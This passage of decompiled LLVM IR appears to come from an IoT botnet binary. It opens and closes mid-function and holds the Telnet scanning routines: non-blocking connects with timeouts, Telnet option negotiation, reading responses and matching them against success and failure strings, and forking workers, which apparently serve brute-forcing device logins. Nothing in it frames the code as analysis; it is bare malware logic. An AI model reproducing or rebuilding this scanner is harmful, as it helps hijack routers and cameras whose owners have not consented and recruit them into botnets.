  %stack_var_-44.024 = phi i32 [ %v1_9b88, %dec_label_pc_9b84 ], [ %tmp33, %dec_label_pc_9b90.preheader ]
  %v2_9a9c = load i32, i32* @global_var_26864.54, align 4
  %v3_9aa8 = call i32 @sockprintf(i32 %v2_9a9c, i32 ptrtoint ([5 x i8]* @global_var_1b718.56 to i32))
  store i32 30, i32* %stack_var_-184, align 4
  br label %dec_label_pc_9ad0

dec_label_pc_9ad0:                                ; preds = %dec_label_pc_9ad0.lr.ph, %dec_label_pc_9ad0
  %storemerge615 = phi i32 [ 0, %dec_label_pc_9ad0.lr.ph ], [ %v1_9ae4, %dec_label_pc_9ad0 ]
  %v5_9adc = mul nuw nsw i32 %storemerge615, 4
  %v6_9adc = add i32 %v5_9adc, %v2_99cc
  %v7_9adc = inttoptr i32 %v6_9adc to i32*
  store i32 0, i32* %v7_9adc, align 4
  %v1_9ae4 = add nuw nsw i32 %storemerge615, 1
  %tmp53 = icmp ult i32 %v1_9ae4, 32
  br i1 %tmp53, label %dec_label_pc_9ad0, label %dec_label_pc_9af8

dec_label_pc_9af8:                                ; preds = %dec_label_pc_9ad0
  %v2_9b18 = load i32, i32* %v1_9a28, align 4
  %v2_9b2c = or i32 %v2_9b18, %v6_9a38
  store i32 %v2_9b2c, i32* %v1_9a28, align 4
  store i32 0, i32* @r2, align 4
  %v5_9b6c = call i32 @__libc_select(i32 %v1_9a5c, i32 %v2_99cc, i32 0, i32 %v2_99cc, i32 %v2_9a68)
  %v5_9b80 = icmp sgt i32 %v5_9b6c, 0
  br i1 %v5_9b80, label %dec_label_pc_9c24.preheader, label %dec_label_pc_9b84

dec_label_pc_9b84:                                ; preds = %dec_label_pc_9af8
  %v1_9b88 = add nsw i32 %stack_var_-44.024, 1
  %v7_9b98 = icmp slt i32 %v1_9b88, 10
  br i1 %v7_9b98, label %dec_label_pc_9ad0.lr.ph, label %dec_label_pc_9c24.preheader

dec_label_pc_9c24.preheader:                      ; preds = %dec_label_pc_9b84, %dec_label_pc_9af8, %dec_label_pc_9b90.preheader, %dec_label_pc_9a08
  %v5_9bcc = bitcast i8* %stack_var_-185 to i32*
  %not.v7_9c2c57 = icmp sgt i32 %arg3, 1
  %v2_9c4459 = icmp eq i1 %not.v7_9c2c57, false
  br i1 %v2_9c4459, label %dec_label_pc_9c4c, label %dec_label_pc_9bb0

dec_label_pc_9bb0:                                ; preds = %dec_label_pc_9c24.preheader, %dec_label_pc_9c18
  %v1_9c2862.in = phi i32 [ %v1_9c2862, %dec_label_pc_9c18 ], [ %arg3, %dec_label_pc_9c24.preheader ]
  %stack_var_-40.061 = phi i8* [ %v5_9c08, %dec_label_pc_9c18 ], [ %arg2, %dec_label_pc_9c24.preheader ]
  %stack_var_-36.060 = phi i32 [ %v1_9c1c, %dec_label_pc_9c18 ], [ 0, %dec_label_pc_9c24.preheader ]
  %v1_9c2862 = add i32 %v1_9c2862.in, -1
  %v2_9bb4 = load i32, i32* @global_var_26864.54, align 4
  %v6_9bcc = call i32 @__libc_recv(i32 %v2_9bb4, i32* %v5_9bcc, i32 1, i32 0, i32 %v1_9c2862)
  %v7_9bd4 = icmp eq i32 %v6_9bcc, 1
  br i1 %v7_9bd4, label %dec_label_pc_9bf4, label %dec_label_pc_9bdc

dec_label_pc_9bdc:                                ; preds = %dec_label_pc_9bb0
  store i8 0, i8* %stack_var_-40.061, align 1
  br label %dec_label_pc_9c60

dec_label_pc_9bf4:                                ; preds = %dec_label_pc_9bb0
  %v3_9bf4 = load i8, i8* %stack_var_-185, align 1
  %v4_9bf8 = ptrtoint i8* %stack_var_-40.061 to i32
  store i8 %v3_9bf4, i8* %stack_var_-40.061, align 1
  %v1_9c04 = add i32 %v4_9bf8, 1
  %v5_9c08 = inttoptr i32 %v1_9c04 to i8*
  %v3_9c0c = load i8, i8* %stack_var_-185, align 1
  %v7_9c10 = icmp eq i8 %v3_9c0c, 10
  br i1 %v7_9c10, label %dec_label_pc_9c4c, label %dec_label_pc_9c18

dec_label_pc_9c18:                                ; preds = %dec_label_pc_9bf4
  %v1_9c1c = add i32 %stack_var_-36.060, 1
  %not.v7_9c2c = icmp sgt i32 %v1_9c2862, 1
  %v2_9c44 = icmp eq i1 %not.v7_9c2c, false
  br i1 %v2_9c44, label %dec_label_pc_9c4c, label %dec_label_pc_9bb0

dec_label_pc_9c4c:                                ; preds = %dec_label_pc_9bf4, %dec_label_pc_9c18, %dec_label_pc_9c24.preheader
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_9c24.preheader ], [ %v1_9c1c, %dec_label_pc_9c18 ], [ %stack_var_-36.060, %dec_label_pc_9bf4 ]
  %stack_var_-40.1 = phi i8* [ %arg2, %dec_label_pc_9c24.preheader ], [ %v5_9c08, %dec_label_pc_9c18 ], [ %v5_9c08, %dec_label_pc_9bf4 ]
  store i8 0, i8* %stack_var_-40.1, align 1
  br label %dec_label_pc_9c60

dec_label_pc_9c60:                                ; preds = %dec_label_pc_9bdc, %dec_label_pc_9c4c
  %storemerge = phi i32 [ -1, %dec_label_pc_9bdc ], [ %stack_var_-36.0.lcssa, %dec_label_pc_9c4c ]
  %v2_9c6c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_9c6c, i32* @fp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_9c2862, { 1, 0, 2 }
  uselistorder i8* %stack_var_-40.061, { 1, 2, 0 }
  uselistorder i32 %v1_9b88, { 1, 0 }
  uselistorder i32 %storemerge615, { 1, 0 }
  uselistorder i32 %storemerge527, { 1, 0 }
  uselistorder i32 %v2_99cc, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 0, 2, 1 }
  uselistorder i8* %stack_var_-185, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9c60, { 1, 0 }
  uselistorder label %dec_label_pc_9c4c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9bb0, { 1, 0 }
  uselistorder label %dec_label_pc_9ad0, { 1, 0 }
  uselistorder label %dec_label_pc_9ad0.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_99e0, { 1, 0 }
}

define i32 @get_telstate_host(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_9c7c = load i32, i32* @fp, align 4
  %v1_9c90 = add i32 %arg1, 4
  %v2_9c90 = inttoptr i32 %v1_9c90 to i32*
  %v3_9c90 = load i32, i32* %v2_9c90, align 4
  store i32 %v3_9c90, i32* @r0, align 4
  %v1_9c9c = call i32 @__GI_inet_ntoa(i32 %v3_9c90)
  store i32 %v3_9c7c, i32* @fp, align 4
  ret i32 %v1_9c9c
}

define i32 @read_until_response(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg3 to i32
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v3_9cb4 = load i32, i32* @fp, align 4
  store i32 40124, i32* %stack_var_-4, align 4
  %v2_9cb8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9cb8, i32* @fp, align 4
  store i32 %arg4, i32* @r2, align 4
  %v4_9ce0 = call i32 @__GI_memset(i8* %arg3, i32 0)
  %v5_9cf4 = call i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %tmp, i32 %arg4)
  %v2_9d04 = load i8, i8* %arg3, align 1
  %v2_9d08 = icmp eq i8 %v2_9d04, -1
  br i1 %v2_9d08, label %dec_label_pc_9d10, label %dec_label_pc_9d20

dec_label_pc_9d10:                                ; preds = %entry
  %v3_9d04 = zext i8 %v2_9d04 to i32
  %v6_9d1c = call i32 @negotiate(i32 %arg1, i32 %tmp, i32 3, i32 %v3_9d04, i32 %v5_9cf4)
  br label %dec_label_pc_9d20

dec_label_pc_9d20:                                ; preds = %entry, %dec_label_pc_9d10
  %v3_9d24 = load i32, i32* %stack_var_0, align 4
  %v3_9d28 = call i32 @contains_string(i32 %tmp, i32 %v3_9d24)
  %v2_9d30 = icmp ne i32 %v3_9d28, 0
  %. = zext i1 %v2_9d30 to i32
  store i32 %v3_9cb4, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i8 %v2_9d04, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_9d20, { 1, 0 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9da0.lr.ph:
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9d60 = load i32, i32* @fp, align 4
  store i32 %v3_9d60, i32* %stack_var_-16, align 4
  store i32 0, i32* %stack_var_-160, align 4
  %v2_9d8c = ptrtoint i32* %stack_var_-152 to i32
  br label %dec_label_pc_9da0

dec_label_pc_9da0:                                ; preds = %dec_label_pc_9da0.lr.ph, %dec_label_pc_9da0
  %storemerge25 = phi i32 [ 0, %dec_label_pc_9da0.lr.ph ], [ %v1_9db4, %dec_label_pc_9da0 ]
  %v5_9dac = mul nuw nsw i32 %storemerge25, 4
  %v6_9dac = add i32 %v5_9dac, %v2_9d8c
  %v7_9dac = inttoptr i32 %v6_9dac to i32*
  store i32 0, i32* %v7_9dac, align 4
  %v1_9db4 = add nuw nsw i32 %storemerge25, 1
  %tmp21 = icmp ult i32 %v1_9db4, 32
  br i1 %tmp21, label %dec_label_pc_9da0, label %dec_label_pc_9dc8

dec_label_pc_9dc8:                                ; preds = %dec_label_pc_9da0
  %v13_9d60 = ptrtoint i32* %stack_var_-16 to i32
  %v3_9dcc = udiv i32 %arg1, 32
  %v3_9dd8 = mul nuw nsw i32 %v3_9dcc, 4
  %v2_9de0 = add nsw i32 %v3_9dd8, -136
  %v2_9de4 = add i32 %v2_9de0, %v13_9d60
  %v1_9de8 = inttoptr i32 %v2_9de4 to i32*
  %v2_9de8 = load i32, i32* %v1_9de8, align 4
  %v1_9df0 = urem i32 %arg1, 32
  %v6_9df8 = shl i32 1, %v1_9df0
  %v2_9dfc = or i32 %v2_9de8, %v6_9df8
  store i32 %v2_9dfc, i32* %v1_9de8, align 4
  %v1_9e1c = add i32 %arg1, 1
  %v2_9e24 = ptrtoint i32* %stack_var_-160 to i32
  %v5_9e38 = call i32 @__libc_select(i32 %v1_9e1c, i32 %v2_9d8c, i32 0, i32 0, i32 %v2_9e24)
  %v5_9e44 = icmp sgt i32 %v5_9e38, 0
  br i1 %v5_9e44, label %dec_label_pc_9e54, label %dec_label_pc_9e48

dec_label_pc_9e48:                                ; preds = %dec_label_pc_9dc8
  br label %dec_label_pc_9e74

dec_label_pc_9e54:                                ; preds = %dec_label_pc_9dc8
  %v5_9e68 = inttoptr i32 %arg3 to i32*
  %v6_9e68 = call i32 @__libc_recv(i32 %arg1, i32* %v5_9e68, i32 %arg4, i32 0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_9e74

dec_label_pc_9e74:                                ; preds = %dec_label_pc_9e48, %dec_label_pc_9e54
  %storemerge = phi i32 [ %v6_9e68, %dec_label_pc_9e54 ], [ 0, %dec_label_pc_9e48 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge25, { 1, 0 }
  uselistorder i32 %v2_9d8c, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_9e74, { 1, 0 }
  uselistorder label %dec_label_pc_9da0, { 1, 0 }
}

define i32 @advance_state(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %v2_9ea0 = icmp eq i32 %arg2, 0
  br i1 %v2_9ea0, label %dec_label_pc_9ea8, label %dec_label_pc_9eb8

dec_label_pc_9ea8:                                ; preds = %entry
  %v2_9eac = load i32, i32* %arg1, align 4
  %v1_9eb4 = call i32 @__libc_close(i32 %v2_9eac)
  br label %dec_label_pc_9eb8

dec_label_pc_9eb8:                                ; preds = %entry, %dec_label_pc_9ea8
  %v2_9ec0 = add i32 %tmp, 16
  %v3_9ec0 = inttoptr i32 %v2_9ec0 to i32*
  store i32 0, i32* %v3_9ec0, align 4
  %v3_9ec4 = load i32, i32* %stack_var_-24, align 4
  %v1_9ed0 = trunc i32 %v3_9ec4 to i8
  %v3_9ed0 = add i32 %tmp, 8
  %v4_9ed0 = inttoptr i32 %v3_9ed0 to i8*
  store i8 %v1_9ed0, i8* %v4_9ed0, align 1
  %v1_9ed8 = add i32 %tmp, 24
  %v2_9ed8 = inttoptr i32 %v1_9ed8 to i32*
  %v3_9ed8 = load i32, i32* %v2_9ed8, align 4
  store i32 512, i32* @r2, align 4
  %v2_9ee8 = inttoptr i32 %v3_9ed8 to i8*
  %v3_9ee8 = call i32 @__GI_memset(i8* %v2_9ee8, i32 0)
  ret i32 %v3_9ee8

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_9eb8, { 1, 0 }
}

define i32 @reset_telstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_9ef8 = load i32, i32* @fp, align 4
  %v2_9f10 = inttoptr i32 %arg1 to i32*
  %v3_9f10 = call i32 @advance_state(i32* %v2_9f10, i32 0)
  %v3_9f1c = add i32 %arg1, 9
  %v4_9f1c = inttoptr i32 %v3_9f1c to i8*
  store i8 1, i8* %v4_9f1c, align 1
  store i32 %v3_9ef8, i32* @fp, align 4
  ret i32 %v3_9f10
}

define i32 @contains_success(i32 %arg1) local_unnamed_addr {
entry:
  %v3_9f28 = load i32, i32* @fp, align 4
  %v3_9f40 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([3 x i8*]* @global_var_264a0.61 to i32))
  store i32 %v3_9f28, i32* @fp, align 4
  ret i32 %v3_9f40
}

define i32 @contains_fail(i32 %arg1) local_unnamed_addr {
entry:
  %v3_9f58 = load i32, i32* @fp, align 4
  %v3_9f70 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([7 x i8*]* @global_var_26480.70 to i32))
  store i32 %v3_9f58, i32* @fp, align 4
  ret i32 %v3_9f70

; uselistorder directives
  uselistorder i32 (i32, i32)* @contains_string, { 2, 1, 0 }
}

define i32 @contains_response(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 40848, i32* %stack_var_-4, align 4
  %v2_9f8c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9f8c, i32* @fp, align 4
  %v1_9f9c = call i32 @contains_success(i32 %arg1)
  %v2_9fa4 = icmp eq i32 %v1_9f9c, 0
  br i1 %v2_9fa4, label %dec_label_pc_9fac, label %dec_label_pc_9fd4

dec_label_pc_9fac:                                ; preds = %entry
  %v1_9fb0 = call i32 @contains_fail(i32 %arg1)
  %v2_9fb8 = icmp ne i32 %v1_9fb0, 0
  %. = zext i1 %v2_9fb8 to i32
  br label %dec_label_pc_9fd4

dec_label_pc_9fd4:                                ; preds = %dec_label_pc_9fac, %entry
  %storemerge1 = phi i32 [ 1, %entry ], [ %., %dec_label_pc_9fac ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @contains_string(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  br label %dec_label_pc_a014

dec_label_pc_a014:                                ; preds = %dec_label_pc_a014, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_a018, %dec_label_pc_a014 ]
  %v1_a018 = add i32 %stack_var_-24.0, 1
  %v3_a024 = mul i32 %v1_a018, 4
  %v2_a030 = add i32 %v3_a024, %arg2
  %v1_a034 = inttoptr i32 %v2_a030 to i32*
  %v2_a034 = load i32, i32* %v1_a034, align 4
  %v2_a038 = icmp eq i32 %v2_a034, 0
  br i1 %v2_a038, label %dec_label_pc_a094.preheader, label %dec_label_pc_a014

dec_label_pc_a094.preheader:                      ; preds = %dec_label_pc_a014
  %v3_a06c = inttoptr i32 %arg1 to i8*
  br label %dec_label_pc_a094

dec_label_pc_a04c:                                ; preds = %dec_label_pc_a094
  %v3_a050 = mul i32 %storemerge2, 4
  %v2_a05c = add i32 %v3_a050, %arg2
  %v1_a060 = inttoptr i32 %v2_a05c to i32*
  %v2_a060 = load i32, i32* %v1_a060, align 4
  %v4_a06c = call i32 @strcasestr(i8* %v3_a06c, i32 %v2_a060, i32 %v3_a050)
  %v2_a074 = icmp eq i32 %v4_a06c, 0
  %v1_a08c = add nuw i32 %storemerge2, 1
  br i1 %v2_a074, label %dec_label_pc_a094, label %dec_label_pc_a0ac

dec_label_pc_a094:                                ; preds = %dec_label_pc_a04c, %dec_label_pc_a094.preheader
  %storemerge2 = phi i32 [ %v1_a08c, %dec_label_pc_a04c ], [ 0, %dec_label_pc_a094.preheader ]
  %v5_a0a0 = icmp slt i32 %storemerge2, %v1_a018
  br i1 %v5_a0a0, label %dec_label_pc_a04c, label %dec_label_pc_a0ac

dec_label_pc_a0ac:                                ; preds = %dec_label_pc_a094, %dec_label_pc_a04c
  %storemerge3 = phi i32 [ 1, %dec_label_pc_a04c ], [ 0, %dec_label_pc_a094 ]
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %storemerge2, { 2, 0, 1 }
  uselistorder i32 %v1_a018, { 1, 0, 2 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_a0c0 = load i32, i32* @fp, align 4
  store i32 %v3_a0c0, i32* %stack_var_-16, align 4
  %v13_a0c0 = ptrtoint i32* %stack_var_-16 to i32
  store i32 0, i32* @r2, align 4
  %v2_a0e8 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_a0f8 = or i32 %v2_a0e8, 2048
  store i32 %v1_a0f8, i32* @r2, align 4
  %v2_a10c = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  store i32 2, i32* %stack_var_-48, align 4
  %v3_a128 = urem i32 %arg3, 65536
  %v1_a130 = call i32 @htons(i32 %v3_a128)
  %v3_a158 = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-44)
  %v2_a160 = icmp eq i32 %v3_a158, 0
  br i1 %v2_a160, label %dec_label_pc_a174, label %dec_label_pc_a168

dec_label_pc_a168:                                ; preds = %entry
  br label %dec_label_pc_a32c

dec_label_pc_a174:                                ; preds = %entry
  %v3_a19c = bitcast i32* %stack_var_-48 to %sockaddr*
  %v4_a19c = call i32 @__libc_connect(i32 %arg1, %sockaddr* %v3_a19c, i32 16)
  %v1_a1ac = icmp slt i32 %v4_a19c, 0
  br i1 %v1_a1ac, label %dec_label_pc_a1b4, label %dec_label_pc_a2f0

dec_label_pc_a1b4:                                ; preds = %dec_label_pc_a174
  %v0_a1b4 = call i32 @__errno_location()
  %v1_a1bc = inttoptr i32 %v0_a1b4 to i32*
  %v2_a1bc = load i32, i32* %v1_a1bc, align 4
  %v7_a1c0 = icmp eq i32 %v2_a1bc, 115
  br i1 %v7_a1c0, label %dec_label_pc_a1ec.lr.ph, label %dec_label_pc_a2e4

dec_label_pc_a1ec.lr.ph:                          ; preds = %dec_label_pc_a1b4
  store i32 %arg4, i32* %stack_var_-184, align 4
  %v2_a1d8 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_a1ec

dec_label_pc_a1ec:                                ; preds = %dec_label_pc_a1ec.lr.ph, %dec_label_pc_a1ec
  %storemerge14 = phi i32 [ 0, %dec_label_pc_a1ec.lr.ph ], [ %v1_a200, %dec_label_pc_a1ec ]
  %v5_a1f8 = mul nuw nsw i32 %storemerge14, 4
  %v6_a1f8 = add i32 %v5_a1f8, %v2_a1d8
  %v7_a1f8 = inttoptr i32 %v6_a1f8 to i32*
  store i32 0, i32* %v7_a1f8, align 4
  %v1_a200 = add nuw nsw i32 %storemerge14, 1
  %tmp32 = icmp ult i32 %v1_a200, 32
  br i1 %tmp32, label %dec_label_pc_a1ec, label %dec_label_pc_a214

dec_label_pc_a214:                                ; preds = %dec_label_pc_a1ec
  %v3_a218 = udiv i32 %arg1, 32
  %v3_a224 = mul nuw nsw i32 %v3_a218, 4
  %v2_a22c = add nsw i32 %v3_a224, -160
  %v2_a230 = add i32 %v2_a22c, %v13_a0c0
  %v1_a234 = inttoptr i32 %v2_a230 to i32*
  %v2_a234 = load i32, i32* %v1_a234, align 4
  %v1_a23c = urem i32 %arg1, 32
  %v6_a244 = shl i32 1, %v1_a23c
  %v2_a248 = or i32 %v2_a234, %v6_a244
  store i32 %v2_a248, i32* %v1_a234, align 4
  %v1_a268 = add i32 %arg1, 1
  %v2_a270 = ptrtoint i32* %stack_var_-184 to i32
  %v5_a288 = call i32 @__libc_select(i32 %v1_a268, i32 0, i32 %v2_a1d8, i32 0, i32 %v2_a270)
  %tmp33 = icmp slt i32 %v5_a288, 1
  br i1 %tmp33, label %dec_label_pc_a2d8, label %dec_label_pc_a298

dec_label_pc_a298:                                ; preds = %dec_label_pc_a214
  %v0_a2bc = call i32 @getsockopt()
  %v3_a2c0 = load i32, i32* %stack_var_-192, align 4
  %v2_a2c4 = icmp eq i32 %v3_a2c0, 0
  br i1 %v2_a2c4, label %dec_label_pc_a2f0, label %dec_label_pc_a2cc

dec_label_pc_a2cc:                                ; preds = %dec_label_pc_a298
  br label %dec_label_pc_a32c

dec_label_pc_a2d8:                                ; preds = %dec_label_pc_a214
  br label %dec_label_pc_a32c

dec_label_pc_a2e4:                                ; preds = %dec_label_pc_a1b4
  br label %dec_label_pc_a32c

dec_label_pc_a2f0:                                ; preds = %dec_label_pc_a174, %dec_label_pc_a298
  store i32 0, i32* @r2, align 4
  %v2_a2fc = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_a30c = and i32 %v2_a2fc, -2049
  store i32 %v1_a30c, i32* @r2, align 4
  %v2_a320 = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  br label %dec_label_pc_a32c

dec_label_pc_a32c:                                ; preds = %dec_label_pc_a2e4, %dec_label_pc_a2d8, %dec_label_pc_a2cc, %dec_label_pc_a168, %dec_label_pc_a2f0
  %stack_var_-212.0 = phi i32 [ 0, %dec_label_pc_a2d8 ], [ 1, %dec_label_pc_a2f0 ], [ 0, %dec_label_pc_a2cc ], [ 0, %dec_label_pc_a2e4 ], [ 0, %dec_label_pc_a168 ]
  ret i32 %stack_var_-212.0

; uselistorder directives
  uselistorder i32 %storemerge14, { 1, 0 }
  uselistorder i32 %v2_a1d8, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 4, 1, 0, 5, 6, 7 }
  uselistorder label %dec_label_pc_a32c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_a2f0, { 1, 0 }
  uselistorder label %dec_label_pc_a1ec, { 1, 0 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v1_a33c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_a33c, i32* @ip, align 4
  %v3_a340 = load i32, i32* @r4, align 4
  %v6_a340 = load i32, i32* @r5, align 4
  %v9_a340 = load i32, i32* @r6, align 4
  %v0_a34c = call i32 @__libc_fork()
  %v2_a35c = icmp eq i32 %v0_a34c, 0
  br i1 %v2_a35c, label %dec_label_pc_a4bc, label %dec_label_pc_a370

dec_label_pc_a370:                                ; preds = %entry
  %v2_a374 = load i32, i32* @global_var_2686c.72, align 4
  %v5_a374 = load i32, i32* @global_var_26870.73, align 4
  %v2_a380 = add i32 %v2_a374, 1
  %v3_a380 = icmp eq i32 %v2_a380, 0
  %v4_a384 = zext i1 %v3_a380 to i32
  %v5_a384 = add i32 %v4_a384, %v5_a374
  store i32 %v2_a380, i32* @global_var_2686c.72, align 4
  store i32 %v5_a384, i32* @global_var_26870.73, align 4
  %v3_a398 = udiv i32 %v2_a380, 1073741824
  %v3_a39c = mul i32 %v5_a384, 4
  %v2_a3a0 = or i32 %v3_a39c, %v3_a398
  store i32 %v2_a3a0, i32* @r4, align 4
  %v3_a3a4 = mul i32 %v2_a380, 4
  %v1_a3a8 = add i32 %v3_a3a4, 4
  %v1_a3b0 = call i32 @malloc(i32 %v1_a3a8)
  br label %dec_label_pc_a408

dec_label_pc_a3c8:                                ; preds = %dec_label_pc_a408, %dec_label_pc_a454
  %v3_a3cc = mul i32 %storemerge2, 4
  %v2_a3d8 = add i32 %v3_a3cc, %v1_a3b0
  %v2_a3ec = load i32, i32* @global_var_2caec.75, align 4
  %v2_a3f0 = add i32 %v2_a3ec, %v3_a3cc
  %v1_a3f4 = inttoptr i32 %v2_a3f0 to i32*
  %v2_a3f4 = load i32, i32* %v1_a3f4, align 4
  %v2_a3f8 = inttoptr i32 %v2_a3d8 to i32*
  store i32 %v2_a3f4, i32* %v2_a3f8, align 4
  %v1_a400 = add i32 %storemerge2, 1
  br label %dec_label_pc_a408

dec_label_pc_a408:                                ; preds = %dec_label_pc_a370, %dec_label_pc_a3c8
  %storemerge2 = phi i32 [ 0, %dec_label_pc_a370 ], [ %v1_a400, %dec_label_pc_a3c8 ]
  %v2_a420 = load i32, i32* @global_var_2686c.72, align 4
  %v5_a420 = load i32, i32* @global_var_26870.73, align 4
  %v2_a434 = add i32 %v2_a420, -1
  %v3_a434 = icmp ne i32 %v2_a420, 0
  %v3_a438 = add i32 %v5_a420, -1
  %v5_a438 = sext i1 %v3_a434 to i32
  %v9_a44c = icmp eq i32 %v3_a438, %v5_a438
  br i1 %v9_a44c, label %dec_label_pc_a454, label %dec_label_pc_a3c8

dec_label_pc_a454:                                ; preds = %dec_label_pc_a408
  store i32 %v2_a434, i32* @r5, align 4
  store i32 %storemerge2, i32* @r6, align 4
  %tmp = icmp ugt i32 %v2_a434, %storemerge2
  br i1 %tmp, label %dec_label_pc_a3c8, label %dec_label_pc_a474

dec_label_pc_a474:                                ; preds = %dec_label_pc_a454
  store i32 %v5_a420, i32* @r4, align 4
  %v3_a47c = mul i32 %v2_a420, 4
  %v2_a488 = add i32 %v1_a3b0, -4
  %v1_a48c = add i32 %v2_a488, %v3_a47c
  %v2_a494 = inttoptr i32 %v1_a48c to i32*
  store i32 %v0_a34c, i32* %v2_a494, align 4
  %v2_a49c = load i32, i32* @global_var_2caec.75, align 4
  store i32 %v2_a49c, i32* @r0, align 4
  %v0_a4a4 = call i32 @free()
  store i32 %v1_a3b0, i32* @global_var_2caec.75, align 4
  br label %dec_label_pc_a4bc

dec_label_pc_a4bc:                                ; preds = %entry, %dec_label_pc_a474
  store i32 %v3_a340, i32* @r4, align 4
  store i32 %v6_a340, i32* @r5, align 4
  store i32 %v9_a340, i32* @r6, align 4
  ret i32 %v0_a34c

; uselistorder directives
  uselistorder i32 %storemerge2, { 0, 2, 1, 3 }
  uselistorder i32 %v3_a3cc, { 1, 0 }
  uselistorder i32 %v1_a3b0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a4bc, { 1, 0 }
  uselistorder label %dec_label_pc_a408, { 1, 0 }
  uselistorder label %dec_label_pc_a3c8, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i8, align 1
  %v1_a4f4 = add i32 %arg2, 1
  %v1_a4f8 = inttoptr i32 %v1_a4f4 to i8*
  %v2_a4f8 = load i8, i8* %v1_a4f8, align 1
  %v7_a504 = icmp ult i8 %v2_a4f8, -5
  br i1 %v7_a504, label %dec_label_pc_a650, label %dec_label_pc_a50c

dec_label_pc_a50c:                                ; preds = %entry
  %v7_a514 = icmp eq i8 %v2_a4f8, -1
  br i1 %v7_a514, label %dec_label_pc_a518, label %dec_label_pc_a534

dec_label_pc_a518:                                ; preds = %dec_label_pc_a50c
  br label %dec_label_pc_a650

dec_label_pc_a534:                                ; preds = %dec_label_pc_a50c
  store i8 -1, i8* %stack_var_-17, align 1
  %v5_a550 = bitcast i8* %stack_var_-17 to i32*
  %v6_a550 = call i32 @__libc_send(i32 %arg1, i32* %v5_a550, i32 1, i32 16384)
  %v2_a55c = load i8, i8* %v1_a4f8, align 1
  %v7_a560 = icmp eq i8 %v2_a55c, -4
  br i1 %v7_a560, label %dec_label_pc_a568, label %dec_label_pc_a574

dec_label_pc_a568:                                ; preds = %dec_label_pc_a534
  store i8 -2, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a614

dec_label_pc_a574:                                ; preds = %dec_label_pc_a534
  %v2_a57c = load i8, i8* %v1_a4f8, align 1
  %v7_a580 = icmp eq i8 %v2_a57c, -2
  br i1 %v7_a580, label %dec_label_pc_a588, label %dec_label_pc_a594

dec_label_pc_a588:                                ; preds = %dec_label_pc_a574
  store i8 -4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a614

dec_label_pc_a594:                                ; preds = %dec_label_pc_a574
  %v2_a59c = load i8, i8* %v1_a4f8, align 1
  %v7_a5a0 = icmp eq i8 %v2_a59c, 3
